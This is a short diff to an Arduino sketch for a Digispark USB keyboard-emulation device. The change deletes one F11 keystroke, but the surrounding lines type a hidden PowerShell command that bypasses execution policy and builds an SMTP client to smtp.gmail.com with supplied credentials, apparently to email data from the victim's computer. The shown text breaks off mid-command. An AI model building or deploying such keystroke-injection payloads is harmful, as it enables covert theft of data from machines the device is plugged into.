@@ -41,7 +41,6 @@ void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  DigiKeyboard.sendKeyStroke(KEY_F11);
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('"));
   DigiKeyboard.print(emailid);
